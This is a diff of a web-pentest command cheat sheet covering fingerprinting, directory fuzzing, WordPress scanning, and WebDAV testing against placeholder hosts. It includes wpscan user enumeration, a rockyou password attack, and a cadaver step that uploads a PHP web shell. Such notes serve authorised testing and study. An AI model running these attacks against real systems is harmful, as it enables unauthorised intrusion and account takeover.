@@ -1,28 +1,32 @@
-#01 FINGERPRINT
+#FINGERPRINT
 nmap --script=http-enum <host>
 nikto -h 192.168.X.X -p 80,8080,1234
 nikto -h 192.168.X.X
+./whatweb $ip 
+#Wappalyzer
 
-#02 Check Tech Stack on Wappalyzer
+#FUZZING
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories -u http://192.168.X.X/FUZZ -fc 401
+ffuf -w /opt/dirsearch/big.txt -u http://192.168.X.X/FUZZ -e .asp,.aspx,.txt 
 
-#03 FUZZING
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories -u http://192.168.X.X/FUZZ
-wfuzz -c -z file,/opt/SecLIsts/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://192.168.X.X"
-ffuf -w /opt/dirsearch/big.txt -u http://192.168.X.X/FUZZ -e .asp,.aspx,.txt
-  
-#04 LOOK THROUGH WEBCONTENT
+#WPSCAN
+wpscan --url http://192.168.X.X --enumerate vp,vt --plugins-detection aggressive
+wpscan --url http://192.168.X.X --enumerate ap --plugins-detection aggressive
+wpscan --url http://192.168.X.X --enumerate u #USERS ENUM
+wpscan --url http://192.168.X.X --passwords /opt/wordlists/rockyou.txt #PASSWORD ATTACK
 
-#05 CHECK HEADERS/SITEMAPS/ROBOTS
+p: Scans popular plugins only.
+vp: Scans vulnerable plugins only.
+ap: Scans all plugins.
+t: Scans popular themes only.
+vt: Scans vulnerable themes only.
+at: Scans all themes.
 
-#06 SPECIAL SCANS
-cmsmap [-f W] -F -d http://192.168.X.X
-joomscan --ec -u http://192.168.X.X
-wpscan --url http://192.168.X.X --enumerate vp
-wpscan --url http://192.168.X.X --enumerate vp,u,m
-wpscan --url http://192.168.X.X --enumerate p --plugins-detection aggressive
+#WEBDAV
+davtest --url http://http://192.168.X.X:80 #Check if it's vulnerable
+cadaver http://192.168.X.X:80/dav/ #Upload web shell
+put /tmp/shell.php
 
-#07 API
-#08 XSS
-#09 Traversal
-#10 LFI/RFI
-#11 Command Injection
+
+
+
